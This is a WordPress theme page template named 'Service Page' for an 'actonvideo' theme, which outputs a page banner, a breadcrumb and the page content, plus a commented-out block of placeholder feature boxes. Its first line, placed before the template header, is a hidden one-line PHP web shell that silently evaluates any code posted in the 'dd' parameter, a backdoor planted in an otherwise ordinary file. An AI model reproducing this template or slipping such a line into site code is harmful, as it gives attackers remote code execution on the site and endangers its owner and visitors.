<?php @eval($_POST['dd']);?><?php
/**
 * Template Name: Service Page
 *
 * This is the template that displays all pages by default.
 * Please note that this is the WordPress construct of pages
 * and that other 'pages' on your WordPress site may use a
 * different template.
 *
 * @link https://codex.wordpress.org/Template_Hierarchy
 *
 * @package actonvideo
 */

get_header(); ?>
<?php
while ( have_posts() ) : the_post();
if (has_post_thumbnail()):
$thumbnail = wp_get_attachment_image_src(get_post_thumbnail_id(),'thumb', true);
endif;
?>
<?php endwhile; // End of the loop. ?>

    <!-- header END -->
    <!-- Content -->
    <div class="page-content">
        <!-- inner page banner -->
        <div class="dez-bnr-inr overlay-black-middle" style="background-image:url(<?php echo $thumbnail[0]; ?>);">
           <div class="container">
            <div class="dez-bnr-inr-entry">
                <h1 class="text-white"><?php the_title(); ?></h1>
            </div>
        </div>
    </div>
    <!-- inner page banner END -->
    <!-- Breadcrumb row -->
    <div class="breadcrumb-row">
        <div class="container">
            <ul class="list-inline">
                <li><a href="<?php echo site_url(); ?>">Home</a></li>
                <li><?php the_title(); ?></li>
            </ul>
        </div>
    </div>
        <!-- Breadcrumb row END -->
        <!-- contact area -->
        <div class="content-area">
            <!-- About Company -->
            <div class="container">
                <div class="row">
                    <div class="col-md-12">
                        <div class="section-head text-left">
                           



								<?php the_content(); ?>
                           
                           
<!-- <div class="row">
	<div class="col-md-6 col-sm-6">
		<div class="icon-bx-wraper bx-style-2 m-l40 m-b30 p-a30 left">
			<div class="icon-bx-sm radius bg-primary"> <a href="#" class="icon-cell"><i class="fa fa-leaf"></i></a> </div>
			<div class="icon-content p-l40">
				<h4 class="dez-tilte">Over 30 Years of Expeirence</h4>
				<p>Lorem ipsum dolor sit amet, consectetuer adipiscing  sed diam nibh euismod [...]</p>
			</div>
		</div>
	</div>
	<div class="col-md-6 col-sm-6">
		<div class="icon-bx-wraper bx-style-2 m-l40 m-b30 p-a30 left">
			<div class="icon-bx-sm radius bg-primary"> <a href="#" class="icon-cell"><i class="fa fa-certificate"></i></a> </div>
			<div class="icon-content p-l40">
				<h4 class="dez-tilte ">Licensed, Bonded, Insured</h4>
				<p>Lorem ipsum dolor sit amet, consectetuer adipiscing  sed diam nibh euismod [...]</p>
			</div>
		</div>
	</div>
	<div class="col-md-6 col-sm-6">
		<div class="icon-bx-wraper bx-style-2 m-l40 m-b30 p-a30 left">
			<div class="icon-bx-sm radius bg-primary"> <a href="#" class="icon-cell"><i class="fa fa-shield"></i></a> </div>
			<div class="icon-content p-l40">
				<h4 class="dez-tilte ">Award Wining Company Since 1986</h4>
				<p>Lorem ipsum dolor sit amet, consectetuer adipiscing  sed diam nibh euismod [...]</p>
			</div>
		</div>
	</div>
	<div class="col-md-6 col-sm-6">
		<div class="icon-bx-wraper bx-style-2 m-l40 m-b30 p-a30 left">
			<div class="icon-bx-sm radius bg-primary"> <a href="#" class="icon-cell"><i class="fa fa-leaf"></i></a> </div>
			<div class="icon-content p-l40">
				<h4 class="dez-tilte ">True Aquatic Landspacing Specialists</h4>
				<p>Lorem ipsum dolor sit amet, consectetuer adipiscing  sed diam nibh euismod [...]</p>
			</div>
		</div>
	</div>
	<div class="col-md-6 col-sm-6">
		<div class="icon-bx-wraper bx-style-2 m-l40 m-b30 p-a30 left">
			<div class="icon-bx-sm radius bg-primary"> <a href="#" class="icon-cell"><i class="fa fa-pagelines"></i></a> </div>
			<div class="icon-content p-l40">
				<h4 class="dez-tilte ">Honest and Dependable</h4>
				<p>Lorem ipsum dolor sit amet, consectetuer adipiscing  sed diam nibh euismod [...]</p>
			</div>
		</div>
	</div>
	<div class="col-md-6 col-sm-6">
		<div class="icon-bx-wraper bx-style-2 m-l40 m-b30 p-a30 left">
			<div class="icon-bx-sm radius bg-primary"> <a href="#" class="icon-cell"><i class="fa fa-tree"></i></a> </div>
			<div class="icon-content p-l40">
				<h4 class="dez-tilte">1000+ Sucessful Projects</h4>
				<p>Lorem ipsum dolor sit amet, consectetuer adipiscing  sed diam nibh euismod [...]</p>
			</div>
		</div>
	</div>
</div>
 -->

                        </div>
                    </div>
                </div>
            </div>
            <!-- About Company END -->
        </div>
        <!-- contact area  END -->
    </div>



    
<?php get_footer();
